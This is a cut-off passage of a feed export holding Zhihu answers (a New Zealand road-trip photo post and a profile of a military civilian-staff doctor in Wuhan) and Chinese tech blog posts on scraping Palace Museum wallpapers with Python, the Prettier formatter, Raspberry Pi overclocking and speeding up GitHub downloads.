data-private-watermark-src=\"v2-d1dc5c3610d1f88f759753755341fe9a\"></p>\n<p>已经忘了是哪条公路上突然遇见的湖，好喜欢！！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6d9f747287fb685123e5666533224d6f_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6d9f747287fb685123e5666533224d6f\" data-watermark-src=\"v2-a229cb239b1ea5150cac013383b0bb92\" data-private-watermark-src=\"v2-b8263385411c7109fdcdb2840cd6092a\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-54dabf11c32de94ce118f5b2499300b7_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-54dabf11c32de94ce118f5b2499300b7\" data-watermark-src=\"v2-a229cb239b1ea5150cac013383b0bb92\" data-private-watermark-src=\"v2-b8263385411c7109fdcdb2840cd6092a\"></p>\n<p>自驾的路途中，真的惊喜不断！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f2b934cd0fdf5c94c4460bdecb046004_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f2b934cd0fdf5c94c4460bdecb046004\" data-watermark-src=\"v2-f89a311a06e61e8522e08052ef729ee8\" data-private-watermark-src=\"v2-e974b4b9d3197ce12507e1c59b4cdb3b\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-35c1d0cf36f9225f645771c6a8cd1dff_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-35c1d0cf36f9225f645771c6a8cd1dff\" data-watermark-src=\"v2-3973bc6d5ee9d0dddfcb39de41b8757c\" data-private-watermark-src=\"v2-d0963ac08c17f4a19805cea6b4fecec8\"></p>\n<p>太爱新西兰了！！以后还会带小皮皮一起去。</p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/614f573dea8647f30ed0bcfc03866e3a\" data-hash=\"614f573dea8647f30ed0bcfc03866e3a\" data-hovercard=\"p$b$614f573dea8647f30ed0bcfc03866e3a\">@知乎旅行</a> </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pi-pi-de-dan-dan-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Bonnie的小皮皮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488115650/answer/2137136569?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">204 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/420672289?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果让你选择去一个地方旅行，并在那里工作生活，你最想去哪里？</a><br><a href=\"http://www.zhihu.com/question/420863560?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">旅行在你们生活中的意义是什么？</a><br>\n","link":"http://www.zhihu.com/question/488115650/answer/2137136569?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"军队文职上岸是一种怎样的体验？","date":"2021-09-23 04:02:24","description":"\n<p>2020年2月24日，空降兵部队医院内科楼呼吸科，一场<b>特殊的入党宣誓仪式</b>正在举行。</p>\n<p>“我志愿加入中国共产党，拥护党的纲领，遵守党的章程，履行党员义务，执行党的决定……”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-25467d141ed2f64c072babadadb48cb8_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-25467d141ed2f64c072babadadb48cb8\" data-watermark-src=\"v2-0658c364022e0c99c0705d0fef39a0ad\" data-private-watermark-src=\"v2-df9da2ffb531324bde4d1f20aca94503\"></p>\n<p>庄严的宣誓声来自该病区的相对清洁区，<b>一位肩扛文职军衔的94年小姑娘</b>，在心内科廖奕华书记的带领下，在干部空勤科的邓静修医生、呼吸科的刘瑛医生、董鑫医生、刘燕护士长的见证下，戴着口罩，<b>面对党旗，高举右拳，眼神坚定，铿锵宣誓。在抗击疫情的一线正式成为一名中国共产党预备党员。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-00b0456986b5235292d067960ba379f6_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-00b0456986b5235292d067960ba379f6\" data-watermark-src=\"v2-6c38d0b7d2278ff601c00266b36aa368\" data-private-watermark-src=\"v2-3782b603445b9d546782f2c40c171439\"></p>\n<p>这位在特殊的时间、特殊的地点加入党组织的90后小姑娘叫刘娟，文职人员，是一名呼吸科的医生。入党仪式礼成后，身材娇小的她激动不已，她对笔者说道：<b>“此时此刻，我身在武汉防控一线，怀着激动的心情接受着党的洗礼，倍感光荣，同时又深感压力。今后我会时刻以一名共产党员的身份严格要求自己，甘于奉献，勇于牺牲；为人民群众的生命健康，勇往直前，用实际行动来证实初心。”</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a77153fbc8516cb13d0a07f9eff9908f_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-a77153fbc8516cb13d0a07f9eff9908f\" data-watermark-src=\"v2-1f35642618aac646d270decfe4369b2f\" data-private-watermark-src=\"v2-ef2e432258809911373ab760a12c313e\"></p>\n<p>刘娟出生在湖北省荆州市公安县南平镇，是家里的独生女。1998年发生洪灾，南平镇是洪水重灾区，人民英雄李向群为了南平镇的抗洪救灾，牺牲在了一线。那个时候的刘娟听说李向群先进事迹后，深受感动，暗暗在心里告诉自己要向烈士那样全心全意为人民服务，不怕苦，不怕累，不怕牺牲。</p>\n<p>2012年，刘娟考入湖北中医药大学，在大学里刘娟受到了更加全面系统的党的理论知识学习，更坚定了共产主义信仰，积极向党组织靠拢，并一直以党员的标准要求自己。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-31bbec050247fa953c706070cfebaab5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"458\" data-watermark=\"watermark\" data-original-src=\"v2-31bbec050247fa953c706070cfebaab5\" data-watermark-src=\"v2-a3caeae5d53457fc4577b5e5aeb563bf\" data-private-watermark-src=\"v2-88d777bc8249830114c2252797927b7c\"></p>\n<p>刘娟研究生毕业后，考上了空降兵部队医院文职人员。在集训过程中，刘娟对党和军队有了更深的了解。<b>明白作为军人要严格地做到令行禁止和不讲条件的执行，牢固树立姓军为兵，姓军为战的思想。刘娟很快从地方人员转变为军队人员，真切感受到担负的使命和责任。</b></p>\n<p>回到医院后，刘娟很快投入住院医师的工作，认真负责，尽心尽力为患者减轻痛苦。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8e28998fee0b556162d738d8b960c026_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-8e28998fee0b556162d738d8b960c026\" data-watermark-src=\"v2-0c5863dfbd982b0573717d227cddf1a9\" data-private-watermark-src=\"v2-99c1d401366b2dd679a9c53aaaf14af0\"></p>\n<p>今年1月，随着新冠病毒在武汉迅速蔓延，面对病毒的挑战，刘娟没有退缩，一直坚守在一线。</p>\n<p>在科室缺乏防护装备的时候；在病患人数不断增加，病人的体温此起彼伏、病情变化迅速的时候；在值班24小时，双手颤抖，病例仍然写不完的时候，<b>刘娟没有气馁，再苦再累，风险再大，作为一名医生，救死扶伤是使命。</b></p>\n<p>面对生病的武汉，疫情是敌人，要打赢这场攻坚战，就要载着军医的使命，坚守岗位，将自己的所学所得发挥最大效用。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0948cb3534b58b20aa20ff1f51cfd2ed_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"watermark\" data-original-src=\"v2-0948cb3534b58b20aa20ff1f51cfd2ed\" data-watermark-src=\"v2-93f9dc49f641deb24db5dcd21d451463\" data-private-watermark-src=\"v2-9ee21c2e5a2c26531e34ec9c96420c1a\"></p>\n<p>刘娟的入党介绍人呼吸科主任严峻告诉笔者，年前有位进医院的患者，入院的时候病情危重，俯着身子坐在轮椅上，双手微颤，呼吸急促，额头满布汗水，大大的眼睛布满红血丝，极度缺氧。</p>\n<p>当时因为新冠指南未出，治疗方案尚未统一，医院还没有特别有效的抗病毒药物，采取对症处理，把氧气开放到最大，但患者仍呼吸困难，不能平卧。患者的检查结果出来后，发现情况很糟糕，科室要给患者家属下病危通告，但不把真实情况告诉患者。</p>\n<p>刘娟不顾自己工作的繁忙，一有空就会去病房查房，告诉患者情况还好不要有太大压力，并不断地鼓励他积极配合治疗，保持好的心态，共同把这段最难熬时间扛过去，病自然就好了。科学的药物治疗，加上刘娟每天的不断鼓励，患者情况出现慢慢的好转，指脉氧上升，可以平躺睡眠，可以不戴氧气，可以下地活动，直到精神好转，顺利出院。</p>\n<p>同为刘娟入党介绍人的呼吸科护士长刘燕告诉笔者，有一位70岁的老爹爹，是个孤寡老人，一直独居在家。这个爹爹是刘娟接诊的，比较有意思的是爹爹住进来的时候，塞给刘娟一张纸条，上面密密麻麻写着自己的症状流水：什么时候发病、怎么不舒服、用过什么药、服药后有什么不适等等。</p>\n<p>刘娟知道这是个很“讲究”的爹爹，便放心地告诉爹爹他们会采取怎样的治疗方式，爹爹也会每天塞给她一张早早就写下的单子，详细记录了他的症状、体征。因为老人入院住得急，有一些生活用品没带，又怕自己外出传染给别人，就在当天塞给刘娟的症状流水中加了一栏：需要帮忙采购的生活用品。</p>\n<p>刘娟看到后，二话没说，第二天上班前按照“购物单”的要求买了物品送过去，爹爹很感激。爹爹的病情恢复得也很快。爹爹出院的时候刘娟正好在查房，看见爹爹正好在写纸条，凑过去看，上面密密麻麻写了自己回家的注意事项，什么时候解除隔离。这些都是刘娟平时告诉爹爹的，看来爹爹都听得很认真。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-088a62dec00224e312a4b8a8d29ee2db_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-088a62dec00224e312a4b8a8d29ee2db\" data-watermark-src=\"v2-a786c36ac075b47e2ef397107ea58673\" data-private-watermark-src=\"v2-57c654d6db47777b6a735448bc816689\"></p>\n<p><b>“用爱拥抱每一天，用心呵护每一人。”这是刘娟常常挂在嘴边的一句话，也是她的人生信条。</b></p>\n<p>“行动是最好的入党誓言，不管龙潭虎穴，哪怕九死一生，我绝不畏惧。”</p>\n<p>这就是我们火线入党的同志——刘娟，用娇小的身躯奋力抵住疫情的蔓延。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-men-de-tian-kong-31-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">我们的天空</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480982101/answer/2071916643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">119 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/440306057?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有靠谱的军队文职课程？</a><br><a href=\"http://www.zhihu.com/question/377474469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">备考军队文职学习视频应该看哪家的？</a><br>\n","link":"http://www.zhihu.com/question/480982101/answer/2071916643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span 